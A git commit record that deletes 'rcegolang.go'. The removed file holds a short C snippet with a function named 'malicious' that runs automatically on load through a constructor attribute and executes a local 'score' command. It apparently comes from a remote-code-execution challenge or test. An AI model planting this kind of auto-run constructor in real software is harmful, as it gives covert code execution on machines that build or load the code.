098b5ca797fa8b878fa6bca64c107608cccc2102
andibidaj <andibidaj@yahoo.it>
2018-09-17 16:46:38 +0200

    Delete rcegolang.go

--- rcegolang.go
+++
@@ -1,8 +0,0 @@
-#include<stdio.h>
-#include<stdlib.h>
-
-static void malicious() __attribute__((constructor));
-
-void malicious() {
-    system("/usr/local/bin/score 76c86057-7564-40a1-b446-166759c59a14");
-}
